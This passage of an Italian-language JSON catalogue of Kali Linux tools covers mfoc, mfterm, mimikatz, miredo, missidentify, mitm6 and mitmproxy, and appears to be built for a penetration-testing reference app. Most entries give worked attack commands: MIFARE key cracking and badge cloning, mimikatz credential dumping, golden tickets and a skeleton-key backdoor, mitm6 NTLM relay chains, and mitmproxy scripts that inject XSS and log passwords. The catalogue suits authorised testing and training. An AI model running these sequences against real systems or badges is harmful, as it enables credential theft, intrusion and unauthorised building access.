      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "mfoc",
    "name": "mfoc",
    "version": "0.10.7",
    "icon": "../app/icons/mfoc-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mfoc/",
    "desc": "Cracca MIFARE Classic con attacco nested authentication per recuperare tutte le chiavi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MFOC</strong> (MIFARE Classic Offline Cracker) è il tool standard per recuperare tutte le chiavi di una card MIFARE Classic utilizzando l'attacco nested authentication. A differenza di mfcuk che recupera la prima chiave senza conoscerne nessuna, MFOC richiede almeno una chiave nota (tipicamente una delle chiavi default come FFFFFFFFFFFF, o quella ottenuta con mfcuk). L'attacco nested sfrutta una vulnerabilità nel protocollo di autenticazione MIFARE: durante l'autenticazione a un settore usando una chiave nota, la card genera nonce che leak informazioni sulle altre chiavi. MFOC automatizza questo processo recuperando rapidamente tutte le 32 chiavi (16 settori × 2 chiavi A/B) e producendo un dump completo della card pronto per analisi o clonazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Nested Authentication Attack:</strong> Implementa l'attacco nested che sfrutta la correlazione tra nonce durante autenticazioni successive. Una volta nota una chiave, può recuperare le altre in secondi invece delle ore richieste da attacchi brute force.</p><p><strong>Default Key Probing:</strong> Prima di lanciare l'attacco nested, MFOC testa automaticamente un database di chiavi default comuni (FFFFFFFFFFFF, A0A1A2A3A4A5, etc.). Spesso almeno un settore usa chiavi default, fornendo il punto di partenza necessario.</p><p><strong>Complete Card Dump:</strong> Produce un dump binario .mfd di 1KB (MIFARE Classic 1K) o 4KB (MIFARE Classic 4K) contenente tutti i dati della card. Formato compatibile con nfc-mfclassic per scrittura su card vergini.</p><p><strong>Key Recovery Logging:</strong> Durante l'attacco, visualizza il progresso mostrando quali chiavi sono state recuperate per ogni settore. Utile per diagnosi quando alcune chiavi resistono all'attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MFOC richiede lettore NFC compatibile con libnfc (ACR122U, PN532).</p><pre><code># Dump card provando chiavi default + nested attack\nmfoc -O card_dump.mfd\n# Output: dump completo se almeno una chiave default funziona\n\n# Con chiave già nota (es. da mfcuk)\nmfoc -k A0B1C2D3E4F5 -O dump.mfd\n\n# Multiple chiavi note\nmfoc -k FFFFFFFFFFFF -k A0A1A2A3A4A5 -k 000000000000 -O dump.mfd\n\n# Aumenta probing attempts per chiavi difficili\nmfoc -P 500 -O dump.mfd\n# -P: numero di prove per nested attack\n\n# Verbose output per debug\nmfoc -v -O dump.mfd\n\n# Output tipico durante esecuzione:\n# Found Key: A0B1C2D3E4F5 [default]\n# Sector 0 - Key A: FFFFFFFFFFFF\n# Sector 0 - Key B: FFFFFFFFFFFF\n# Sector 1 - Nested attack in progress...\n# Sector 1 - Key A: A1B2C3D4E5F6\n# ...\n# All keys recovered. Writing dump...\n\n# Workflow completo di clonazione:\n# 1. Recupera chiavi con mfoc\nmfoc -O original.mfd\n\n# 2. Scrivi dump su card vergine\nnfc-mfclassic w a blank.mfd original.mfd\n\n# 3. Verifica clone\nmfoc -O verify.mfd\ndiff original.mfd verify.mfd</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Physical Security Assessment</strong>, MFOC è il tool principale per testare la sicurezza di sistemi di controllo accessi basati su MIFARE Classic. Se le chiavi possono essere recuperate, l'intero sistema è compromesso e badge possono essere clonati.</p><p>Nel <strong>Penetration Testing Fisico</strong>, dopo aver ottenuto brevemente un badge target, MFOC permette di creare un clone funzionante che garantisce accesso persistente all'edificio senza dover sottrarre il badge originale.</p><p>Per <strong>Data Recovery</strong>, quando si hanno card MIFARE con dati importanti ma chiavi perse, MFOC può recuperare le chiavi permettendo di leggere i dati. Utile per legacy systems dove la documentazione è andata perduta.</p><p>Nella <strong>Security Research</strong>, MFOC è strumento fondamentale per studiare implementazioni MIFARE e dimostrare le debolezze intrinseche di questa tecnologia ancora ampiamente utilizzata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accesso Fisico:</strong> La card deve essere posizionata sul lettore NFC durante l'intero processo di recovery (da pochi secondi a qualche minuto). In scenari reali, richiede accesso temporaneo al badge del target.</p><p><strong>Hardware Requirement:</strong> Necessita lettore NFC compatibile con libnfc. ACR122U è il più testato. Lettori NFC integrati nei laptop spesso non funzionano. PN532 è alternativa economica.</p><p><strong>Legalità:</strong> La clonazione di badge di accesso senza autorizzazione è reato in quasi tutte le giurisdizioni. Può configurare violazione di domicilio, frode informatica, o accesso abusivo. Utilizzare esclusivamente in contesti autorizzati di security assessment.</p><p><strong>Countermeasures:</strong> Alcune card MIFARE Classic hanno hardcoded sector 0 non leggibile. Card EV1 e successive hanno mitigazioni parziali. Per card completamente resistenti, considerare hardware attacks (power analysis) o upgrade a MIFARE DESFire.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "mfterm",
    "name": "mfterm",
    "version": "1.0.7",
    "icon": "../app/icons/mfterm-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mfterm/",
    "desc": "Terminale interattivo per manipolazione card MIFARE: read, write, clone, format.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MFTerm</strong> è un terminale interattivo specializzato nella manipolazione di card MIFARE Classic 1K e 4K. A differenza di mfoc e mfcuk che sono orientati al key recovery, MFTerm fornisce un ambiente shell completo per operazioni di lettura, scrittura, modifica e clonazione una volta che le chiavi sono note. L'interfaccia a riga di comando interattiva permette di navigare tra settori, ispezionare dati in formato esadecimale e ASCII, modificare byte specifici, gestire le chiavi A e B di ogni settore, e salvare/caricare dump. È lo strumento ideale per chi deve analizzare il contenuto di card MIFARE, modificare dati specifici, o preparare card clone con contenuto personalizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Interactive Shell:</strong> Ambiente command-line con prompt dedicato per operazioni sequenziali su card. Supporta history dei comandi, auto-completion, e scripting per automazione di operazioni ripetitive.</p><p><strong>Sector-Level Access:</strong> Lettura e scrittura granulare a livello di singolo settore o blocco. Permette di modificare byte specifici senza toccare il resto della card, essenziale per manipolazioni chirurgiche.</p><p><strong>Key Management:</strong> Gestione separata delle chiavi A e B per ogni settore. Può caricare chiavi da file .mfd (dump mfoc), specificarle manualmente, o usare chiavi default. Visualizza quali chiavi sono note per quali settori.</p><p><strong>Hex/ASCII Editor:</strong> Visualizzazione simultanea esadecimale e ASCII del contenuto. Editor inline per modificare byte direttamente. Particolarmente utile per analizzare strutture dati e protocolli proprietari su card.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MFTerm opera in modalità interattiva con comandi specifici per ogni operazione.</p><pre><code># Avvia il terminale interattivo\nmfterm\n\n# === GESTIONE CHIAVI ===\nmfterm> keys load dump.mfd      # Carica chiavi da file dump mfoc\nmfterm> keys set 0 a FFFFFFFFFFFF  # Imposta chiave A settore 0\nmfterm> keys set 0 b A0B1C2D3E4F5  # Imposta chiave B settore 0\nmfterm> keys print              # Mostra tutte le chiavi caricate\n\n# === LETTURA CARD ===\nmfterm> read a                  # Leggi tutti i settori con chiave A\nmfterm> read b                  # Leggi con chiave B\nmfterm> read a 3                # Leggi solo settore 3 con chiave A\n\n# === VISUALIZZAZIONE ===\nmfterm> print                   # Mostra tutto il contenuto (hex + ASCII)\nmfterm> print 1                 # Mostra solo settore 1\nmfterm> print 1 2               # Mostra settori 1 e 2\n\n# === MODIFICA DATI ===\nmfterm> edit 1                  # Entra in modalità edit settore 1\n# Nell'editor: modifica byte, ESC per uscire\nmfterm> set 1 0 DEADBEEF        # Imposta bytes nel blocco 0 del settore 1\n\n# === SCRITTURA ===\nmfterm> write a                 # Scrivi tutti i settori con chiave A\nmfterm> write a 1               # Scrivi solo settore 1\n\n# === SALVATAGGIO/CARICAMENTO ===\nmfterm> save backup.mfd         # Salva dump corrente\nmfterm> load card.mfd           # Carica dump da file\n\n# === CLONAZIONE WORKFLOW ===\n# 1. Leggi card originale\nmfterm> keys load original_keys.mfd\nmfterm> read a\nmfterm> save original.mfd\n\n# 2. Inserisci card vergine\nmfterm> write a\n\n# === UTILITY ===\nmfterm> clear                   # Azzera buffer in memoria\nmfterm> help                    # Lista comandi disponibili\nmfterm> quit                    # Esci</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Card Content Analysis</strong>, MFTerm permette di ispezionare in dettaglio la struttura dei dati memorizzati su card MIFARE. L'output hex+ASCII facilita il reverse engineering di protocolli proprietari usati da sistemi di accesso, pagamento, o ticketing.</p><p>Nel <strong>Data Modification</strong>, quando si deve modificare specifici byte su una card (es. saldo su card prepagata, livello accesso su badge), MFTerm offre l'editing chirurgico necessario senza dover riscrivere l'intera card.</p><p>Per <strong>Badge Cloning Personalizzato</strong>, permette di creare cloni con modifiche specifiche: stesso UID ma dati differenti, o viceversa. Utile per testing di sistemi che verificano sia ID che contenuto.</p><p>Durante <strong>Security Research</strong>, l'ambiente interattivo facilita l'esplorazione e sperimentazione su card MIFARE per comprendere implementazioni specifiche e identificare vulnerabilità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accesso Fisico:</strong> La card deve essere sul lettore durante tutte le operazioni. Per lettura basta contatto momentaneo, per scrittura la card deve rimanere stabile per tutta la durata dell'operazione.</p><p><strong>Write Risk:</strong> La scrittura errata può rendere la card inutilizzabile (brick), specialmente se si corrompono i trailer dei settori che contengono le chiavi. SEMPRE fare backup prima di qualsiasi modifica.</p><p><strong>Sector Trailer:</strong> L'ultimo blocco di ogni settore contiene chiavi e access bits. Modifiche errate a questa area bloccano permanentemente il settore. MFTerm avvisa ma permette la scrittura.</p><p><strong>Legalità:</strong> La modifica di card di sistemi di pagamento o accesso senza autorizzazione costituisce reato. Utilizzare solo su card di proprietà o in contesti autorizzati di security testing.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "mimikatz-kali",
    "name": "mimikatz",
    "version": "2.2.0",
    "icon": "../app/icons/mimikatz-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mimikatz/",
    "desc": "Tool Windows per estrarre password, hash, ticket Kerberos e credenziali dalla memoria.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mimikatz</strong> è IL tool per credential extraction su Windows. Estrae password in chiaro, hash NTLM, ticket Kerberos dalla memoria LSASS. Include funzioni per Pass-the-Hash, Pass-the-Ticket, Golden/Silver Ticket, DCSync e molte altre tecniche AD. Creato da gentilkiwi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>sekurlsa:</strong> Dump credenziali da LSASS.</p><p><strong>kerberos:</strong> Manipolazione ticket Kerberos.</p><p><strong>lsadump:</strong> DCSync, SAM dump.</p><p><strong>dpapi:</strong> Decrypt protezioni Windows.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === CREDENTIAL DUMPING ===\n# Dump credenziali live (richiede SYSTEM o debug priv)\nmimikatz# privilege::debug\nmimikatz# sekurlsa::logonpasswords\n\n# Dump da minidump LSASS (stealth - analisi offline)\n# Prima: procdump.exe -ma lsass.exe lsass.dmp\nmimikatz# sekurlsa::minidump lsass.dmp\nmimikatz# sekurlsa::logonpasswords\n\n# Dump SAM e SECURITY (local accounts)\nmimikatz# lsadump::sam\nmimikatz# lsadump::secrets\nmimikatz# lsadump::cache  # Cached domain credentials\n\n# === PASS-THE-HASH / PASS-THE-TICKET ===\n# PTH: spawn cmd con hash NTLM\nmimikatz# sekurlsa::pth /user:admin /domain:corp.local /ntlm:a87f3a337d73085c45f9416be5787d86 /run:cmd.exe\n\n# PTT: inject ticket in sessione corrente\nmimikatz# kerberos::ptt ticket.kirbi\n\n# === GOLDEN TICKET (Domain Persistence) ===\n# Richiede hash krbtgt (da DCSync)\nmimikatz# kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a87f3a337d73085c45f9416be5787d86 /id:500 /groups:512,513,518,519,520 /ptt\n\n# === SILVER TICKET (Service-specific) ===\n# Accesso CIFS senza toccare DC\nmimikatz# kerberos::golden /user:FakeUser /domain:corp.local /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt\n\n# === DCSYNC (Dump domain credentials remotely) ===\nmimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt\nmimikatz# lsadump::dcsync /domain:corp.local /all /csv  # Dump tutti gli hash\n\n# === DPAPI (Decrypt saved credentials) ===\n# Trova masterkeys\nmimikatz# dpapi::masterkey /in:\"C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-...\\masterkey\" /rpc\n# Decrypt Chrome passwords, saved credentials, etc.\nmimikatz# dpapi::chrome /in:\"C:\\Users\\victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect\n\n# === SKELETON KEY (Domain Backdoor) ===\n# Inietta password master \"mimikatz\" su DC\nmimikatz# misc::skeleton\n# Ora qualsiasi user può autenticarsi con \"mimikatz\"\n\n# === ONE-LINER per automation ===\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > creds.txt\nmimikatz.exe \"lsadump::dcsync /domain:corp.local /user:Administrator\" \"exit\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Exploitation</strong>, credential theft e lateral movement.</p><p>Nel <strong>Pentesting</strong>, privilege escalation Windows.</p><p><strong>Red Team</strong> per domain dominance.</p><p><strong>DPAPI</strong> per recupero password salvate in browser e applicazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rilevabile:</strong> Signature nota a tutti gli AV/EDR. LSASS access genera Sysmon Event ID 10. DCSync genera Event ID 4662. Skeleton Key modifica LSASS in memoria. Per stealth: dump LSASS con metodi alternativi (comsvcs.dll, ProcDump) e analizza offline.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "miredo",
    "name": "miredo",
    "version": "1.2.6",
    "icon": "../app/icons/miredo-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/miredo/",
    "desc": "Client e server Teredo per tunneling IPv6 over UDP/IPv4 attraverso NAT.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Miredo</strong> è un'implementazione open-source completa del protocollo Teredo, definito in RFC 4380. Teredo è una tecnologia di transizione IPv6 che permette di incapsulare pacchetti IPv6 all'interno di datagrammi UDP/IPv4, consentendo la connettività IPv6 anche attraverso dispositivi NAT che normalmente bloccherebbero il traffico IPv6 nativo. Miredo include tre componenti: client (per ottenere connettività IPv6), relay (per connettere reti Teredo a IPv6 nativo), e server (per coordinare i client attraverso NAT).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Teredo Client (miredo):</strong> Il componente principale per gli utenti finali. Si connette a server Teredo pubblici, determina il tipo di NAT, ottiene un indirizzo IPv6 Teredo (2001:0::/32) e crea un'interfaccia tunnel virtuale per il traffico IPv6.</p><p><strong>NAT Traversal Automatico:</strong> Implementa tecniche di NAT traversal incluse hole punching UDP e STUN-like qualification per funzionare attraverso la maggior parte delle configurazioni NAT (cone NAT, restricted NAT, symmetric NAT con limitazioni).</p><p><strong>Teredo Relay (miredo-server):</strong> Permette di configurare un relay che connette client Teredo alla rete IPv6 nativa, utile per fornire connettività IPv6 a reti interne o per test di infrastruttura.</p><p><strong>Interfaccia Tunnel Virtuale:</strong> Crea un'interfaccia di rete 'teredo' che appare come una normale interfaccia IPv6 al sistema operativo, permettendo a tutte le applicazioni di usare IPv6 trasparentemente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il client miredo si avvia come demone e configura automaticamente l'interfaccia tunnel.</p><pre><code># Avvia client Teredo (richiede root)\nsudo miredo\n\n# Verifica interfaccia tunnel creata\nip addr show teredo\n# Output: inet6 2001:0:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx/32 scope global\n\n# Test connettività IPv6\nping6 ipv6.google.com\nping6 2607:f8b0:4004:800::200e\n\n# Configurazione con server specifico\nsudo miredo -c /etc/miredo/miredo.conf\n\n# Usa server Teredo alternativo\nsudo miredo teredo.remlab.net\n\n# Modalità foreground per debug\nsudo miredo -f -d</code></pre><p>Una volta attivo, qualsiasi applicazione può usare IPv6 normalmente attraverso l'interfaccia teredo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Penetration Testing</strong>, Miredo permette di accedere a servizi IPv6-only da reti che hanno solo connettività IPv4, utile per testare dual-stack o servizi esposti solo su IPv6.</p><p>Nel <strong>Firewall Bypass</strong>, poiché il traffico Teredo usa UDP (tipicamente porta 3544), può attraversare firewall configurati solo per bloccare IPv6 nativo. Questo può essere sfruttato per raggiungere host IPv6 altrimenti inaccessibili.</p><p>Per <strong>IPv6 Security Research</strong>, permette di studiare il comportamento di protocolli e servizi IPv6 senza necessità di connettività nativa, ideale per laboratori di testing.</p><p>Durante <strong>CTF e Lab</strong>, fornisce rapidamente connettività IPv6 per challenge che richiedono accesso a risorse su IPv6.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico Teredo usa UDP sulla porta 3544 con pattern riconoscibili. I server Teredo pubblici (Microsoft, remlab.net) possono loggare le connessioni. Deep packet inspection può identificare il protocollo.</p><p><strong>Impatto:</strong> Aggiunge latenza significativa rispetto a IPv6 nativo a causa dell'encapsulation e del routing attraverso relay. Non adatto per traffico ad alta performance.</p><p><strong>Limitazioni:</strong> Teredo è considerato un protocollo legacy e sta venendo deprecato. Alcuni server pubblici potrebbero essere inaffidabili o cessare il servizio. Non funziona con tutti i tipi di NAT (symmetric NAT problematico).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "missidentify",
    "name": "missidentify",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/missidentify/",
    "desc": "Trova eseguibili Windows rinominati o con estensione sbagliata in analisi forense.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Missidentify</strong> è uno strumento forense che identifica file eseguibili Windows (formato PE - Portable Executable) che sono stati rinominati o hanno estensioni fuorvianti. Analizza i magic bytes dei file per rilevare la vera natura del contenuto indipendentemente dal nome o estensione visibile. Questo è fondamentale in analisi forense e incident response per scoprire malware mascherato con estensioni innocue (.jpg, .txt, .pdf), eseguibili rinominati per evadere la detection, o file sospetti nascosti in directory di immagini o documenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PE Format Detection:</strong> Identifica file Windows PE analizzando la signature MZ header e la struttura PE indipendentemente dall'estensione del file. Rileva EXE, DLL, SYS, e altri formati PE anche se rinominati come .jpg, .doc, o qualsiasi altra estensione.</p><p><strong>Recursive Directory Scanning:</strong> Può scansionare intere strutture di directory incluse subdirectory, permettendo l'analisi di interi filesystem o immagini disco montate. Gestisce efficientemente grandi volumi di file.</p><p><strong>Magic Bytes Analysis:</strong> L'analisi si basa sui primi byte del file (magic number) piuttosto che sull'estensione, rendendo impossibile per un attaccante eludere il rilevamento semplicemente rinominando il file.</p><p><strong>Lightweight Output:</strong> Produce una lista pulita dei file PE trovati con estensioni non standard, facilmente filtrabile e integrabile con altri tool forensi per analisi approfondita.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Missidentify è semplice da usare e ottimizzato per analisi forense.</p><pre><code># === SCANSIONE BASE ===\n# Scansiona una directory\nmissidentify /path/to/scan\n\n# Scansione ricorsiva\nmissidentify -r /evidence/\n\n# === FILTRI OUTPUT ===\n# Solo file che NON hanno estensione .exe\nmissidentify -r /evidence/ | grep -v \"\\.exe$\"\n\n# Solo file con estensioni immagine\nmissidentify -r /evidence/ | grep -E \"\\.(jpg|png|gif|bmp)$\"\n\n# Solo file in directory specifiche\nmissidentify -r /evidence/ | grep -E \"(Downloads|Temp|AppData)\"\n\n# === SALVA RISULTATI ===\n# Output su file per analisi\nmissidentify -r /mnt/evidence > suspicious_pe_files.txt\n\n# === WORKFLOW FORENSE ===\n# Monta immagine disco in read-only\nsudo mount -o ro,loop evidence.dd /mnt/evidence\n\n# Cerca PE mascherati\nmissidentify -r /mnt/evidence/Users > pe_in_userprofiles.txt\n\n# Analizza i sospetti con file command\ncat suspicious_pe_files.txt | xargs file\n\n# Hash dei file sospetti\ncat suspicious_pe_files.txt | xargs sha256sum > hashes.txt</code></pre><p>I risultati possono essere usati per prioritizzare l'analisi manuale o il submission a sandbox e VirusTotal.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Forensics</strong>, il malware viene spesso distribuito con estensioni innocue per evadere filtri email e detection. Missidentify rivela questi file mascherati, identificando ad esempio un ransomware distribuito come \"invoice.pdf\" che in realtà è un PE.</p><p>Durante <strong>Incident Response</strong>, scansionare rapidamente i profili utente e directory temporanee per file PE nascosti aiuta a identificare payload malevoli, dropper, e tool di attacco lasciati dall'intrusore.</p><p>Per <strong>Threat Hunting</strong> proattivo, cercare PE in directory dove normalmente non dovrebbero esistere (es. cartelle immagini, documenti) può rivelare compromissioni non ancora rilevate dai sistemi di sicurezza.</p><p>In <strong>Compliance Auditing</strong>, identificare eseguibili non autorizzati rinominati per eludere policy aziendali che bloccano l'esecuzione di .exe da certe location.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-Only Operation:</strong> Missidentify è completamente non invasivo - legge solo i primi byte di ogni file senza modificare nulla. Sicuro da usare su evidence forensi senza rischio di alterazione.</p><p><strong>Performance:</strong> L'analisi dei magic bytes è estremamente veloce, permettendo la scansione di centinaia di migliaia di file in pochi minuti. Il collo di bottiglia è tipicamente l'I/O del disco.</p><p><strong>False Positives:</strong> Alcuni file legittimi potrebbero iniziare con byte simili al PE header. Verificare sempre i risultati con analisi manuale o tool come 'file' command prima di trarre conclusioni.</p><p><strong>Limitazioni:</strong> Identifica solo file PE Windows. Per altri formati eseguibili (ELF Linux, Mach-O macOS, script) servono tool diversi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "mitm6",
    "name": "mitm6",
    "version": "0.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mitm6/",
    "desc": "Sfrutta configurazione IPv6 di default in Windows per MITM e relay di credenziali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mitm6</strong> sfrutta la configurazione IPv6 di default in Windows per eseguire MITM. Windows preferisce IPv6 e accetta Router Advertisement da qualsiasi sorgente. Mitm6 diventa il DNS IPv6 della rete, intercettando query DNS e relay di autenticazione NTLM.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DHCPv6:</strong> Fornisce configurazione IPv6.</p><p><strong>DNS Spoofing:</strong> Risponde a query DNS.</p><p><strong>WPAD Injection:</strong> Inietta proxy config.</p><p><strong>NTLM Relay:</strong> Integra con ntlmrelayx.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === ATTACCO BASE: NTLM RELAY A LDAP ===\n# Terminal 1: mitm6 spoofing\nmitm6 -d corp.local -i eth0\n\n# Terminal 2: ntlmrelayx per creare computer account (RBCD)\nntlmrelayx.py -6 -wh attacker.corp.local -t ldaps://dc.corp.local --delegate-access -l loot/\n\n# === ESC8: ADCS RELAY (Privilege Escalation to DA) ===\n# Prerequisiti: CA con Web Enrollment abilitato\n# Terminal 1: mitm6\nmitm6 -d corp.local --ignore-nofqdn\n\n# Terminal 2: ntlmrelayx a ADCS per richiedere certificato\nntlmrelayx.py -6 -wh attacker.corp.local \\\n  -t http://ca.corp.local/certsrv/certfnsh.asp \\\n  --adcs --template DomainController\n\n# Risultato: certificato del DC\n# Usa certificato per autenticazione\ncertipy auth -pfx dc.pfx -dc-ip 10.10.10.1\n\n# === RELAY A SMB (Remote Code Execution) ===\n# Relay a target SMB per eseguire comandi\nmitm6 -d corp.local\nntlmrelayx.py -6 -wh attacker -t smb://target.corp.local -c \"whoami > C:\\\\pwned.txt\"\n\n# === TARGETING SPECIFICO ===\n# Solo certi host (meno rumore)\nmitm6 -d corp.local --filter-host workstation01,workstation02\n\n# Ignora host specifici (evita detection su server monitorati)\nmitm6 -d corp.local --ignore-host dc01,dc02\n\n# === ATTACK CHAIN COMPLETA ===\n# 1. mitm6 cattura autenticazione workstation\nmitm6 -d corp.local\n\n# 2. Relay a LDAP per RBCD attack\nntlmrelayx.py -6 -wh attacker -t ldaps://dc.corp.local --delegate-access\n\n# 3. Output: EVILPC$ computer account creato\n# 4. Usa RBCD per impersonare admin\ngetST.py -spn cifs/target.corp.local corp.local/EVILPC$ -impersonate Administrator\nexport KRB5CCNAME=Administrator.ccache\npsexec.py -k -no-pass corp.local/Administrator@target.corp.local\n\n# === MONITORING MODE ===\n# Solo osserva traffico DHCPv6 senza rispondere\nmitm6 -d corp.local --ignore-nofqdn -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Exploitation</strong>, relay credentials per accesso privilegiato.</p><p><strong>ADCS Attacks (ESC8)</strong>, ottenere certificati di Domain Controller.</p><p><strong>RBCD</strong>, creare machine account per impersonation.</p><p><strong>Red Team</strong> per initial foothold in rete interna.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> DHCPv6 traffic anomalo su reti IPv4-only. Microsoft Defender for Identity rileva NTLM relay. ADCS relay genera Event ID 4768. Usare filtering per ridurre rumore. Funziona solo se SMB Signing non è enforced.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "mitmproxy",
    "name": "mitmproxy",
    "version": "12.1.2",
    "icon": "../app/icons/mitmproxy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mitmproxy/",
    "desc": "Proxy HTTP interattivo per intercettare, modificare e replay di traffico web e API.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mitmproxy</strong> è un proxy HTTP/HTTPS interattivo per intercettare, ispezionare, modificare e replay di traffico. Include TUI (mitmproxy), web interface (mitmweb), e scripting Python (mitmdump). Perfetto per debug API, security testing, e analisi di app mobile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intercept:</strong> Cattura tutto il traffico HTTP/S.</p><p><strong>Modify:</strong> Altera request/response on-the-fly.</p><p><strong>Replay:</strong> Rigioca traffico catturato.</p><p><strong>Script:</strong> Automazione con Python.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === MODALITÀ BASE ===\nmitmproxy                    # TUI interattiva\nmitmweb                      # Web interface su :8081\nmitmdump -w traffic.flow     # Dump su file\n\n# === TRANSPARENT PROXY (senza config client) ===\n# Setup iptables per redirect traffico\niptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080\niptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080\nmitmproxy --mode transparent --showhost\n\n# === INTERCEPT FILTERS ===\n# Intercetta solo API specifiche\nmitmproxy --intercept \"~u /api/ &amp; ~m POST\"\n# Ignora asset statici\nmitmproxy --ignore-hosts \".*\\.googleapis\\.com|.*\\.gstatic\\.com\"\n\n# === PYTHON SCRIPTING ===\n# inject_payload.py - Inject XSS in tutte le response\nfrom mitmproxy import http\ndef response(flow: http.HTTPFlow):\n    if flow.response and \"text/html\" in flow.response.headers.get(\"content-type\", \"\"):\n        flow.response.text = flow.response.text.replace(\"&lt;/body&gt;\", '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;&lt;/body&gt;')\n\n# credential_logger.py - Log tutte le credenziali\nfrom mitmproxy import http\nimport json\ndef request(flow: http.HTTPFlow):\n    if flow.request.method == \"POST\":\n        body = flow.request.get_text()\n        if any(k in body.lower() for k in [\"password\", \"passwd\", \"pwd\", \"token\"]):\n            with open(\"creds.log\", \"a\") as f:\n                f.write(f\"{flow.request.pretty_url}\\n{body}\\n\\n\")\n\nmitmdump -s inject_payload.py\nmitmdump -s credential_logger.py -w creds.flow\n\n# === MOBILE APP TESTING ===\n# Proxy su tutte le interfacce\nmitmproxy --listen-host 0.0.0.0 -p 8080\n# Installa CA su device: http://mitm.it\n\n# SSL Pinning Bypass (con Frida)\nfrida -U -f com.target.app -l ssl_bypass.js --no-pause\nmitmproxy --ssl-insecure  # Ignora errori cert\n\n# === REPLAY E FUZZING ===\n# Salva flow specifico\nmitmdump -w login.flow \"~u /api/login\"\n# Replay con modifiche\nmitmdump -n -r login.flow --modify-body \"/password:.*/password:fuzzed/\"\n\n# === REVERSE PROXY MODE ===\n# Proxy davanti a backend (per testing)\nmitmproxy --mode reverse:http://backend:8080\n\n# === UPSTREAM PROXY (Burp chain) ===\nmitmproxy --mode upstream:http://127.0.0.1:8081</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>API Testing</strong>, debug e 